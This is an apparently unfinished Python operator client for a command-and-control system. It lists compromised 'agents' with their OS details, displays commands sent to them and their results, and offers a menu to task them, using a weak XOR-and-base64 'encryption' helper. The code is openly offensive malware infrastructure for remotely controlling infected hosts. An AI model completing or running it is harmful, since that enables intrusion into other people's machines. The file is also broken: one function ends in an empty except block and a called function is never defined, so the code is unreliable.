import requests
import sys
import json
import base64

with open("config.json") as f:
    cfg = json.load(f)

SERVER_URL = f"http://{cfg['server_host']}:{cfg['server_port']}"
CRYPTO_KEY = cfg.get("crypto_key", "secret")

# Colors
GREEN  = "\033[92m"
RED    = "\033[91m"
BLUE   = "\033[94m"
YELLOW = "\033[93m"
RESET  = "\033[0m"

def xor(data: str, key=CRYPTO_KEY) -> str:
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def encrypt(data: str, key=CRYPTO_KEY) -> str:
    return base64.b64encode(xor(data, key).encode()).decode()

def list_agents():
    try:
        response = requests.get(f"{SERVER_URL}/agents", timeout=10)
        response.raise_for_status()
        data = response.json()

        print(RED + "---- Agents ----" + RESET)
        if not data:
            print("No agents registered.")
            return
        for count, a in enumerate(data, start=1):
            print(f"{count}: {a['agent_id']} ({a['status']}) ({a['os_info']})")
    except Exception as e:
        print(RED + f"Error fetching agents: {e}" + RESET)

def list_tasks(status):
    try:
        response = requests.get(f"{SERVER_URL}/agents", timeout=10)
        response.raise_for_status()
        data = response.json()
    except:
        




    
def show_agent_commands():
    try:
        agent_id = input("Enter the Agent ID: ")
        response = requests.get(f"{SERVER_URL}/agents/{agent_id}", timeout=10)
        response.raise_for_status()
        data = response.json()
        commands = data.get("Commands", [])

        print(RED + "---- Agent Commands ----" + RESET)
        print(f"Agent: {agent_id}")

        if not commands:
            print("No commands found for this agent.")
            return

        for count, cmd in enumerate(commands, start=1):
            print(f"{YELLOW}{'-' * 100}{RESET}")
            print(f"Command ID : {cmd['Command Id']}")
            print(f"Command    : {cmd['Command']}")
            print(f"Status     : {cmd['Status']}")
            print(f"Result     :\n{cmd['Result']}")
            
    except Exception as e:
        print(RED + f"Error fetching agent commands: {e}" + RESET)


def main():
    while True:
        print(GREEN + "\n--- C2 Operator Menu ---" + RESET)
        print(BLUE + "1. List agents")
        print("2. Show agent details with commands and results")
        print("3. Send command to agent")
        print("4. List queued tasks")
        print("5. List completed tasks")
        print("6. Exit" + RESET)

        choice = input("Select an option: ").strip()
        print("\n")

        if choice == "1":
            list_agents()
        elif choice == "2":
            show_agent_commands()
        elif choice == "3":
            send_command()
        elif choice == "4":
            list_tasks("Queued")
        elif choice == "5":
            list_tasks("Completed")
        elif choice == "6":
            print("Exiting...")
            sys.exit(0)
        else:
            print("Invalid option. Try again.")


if __name__ == "__main__":
    main()
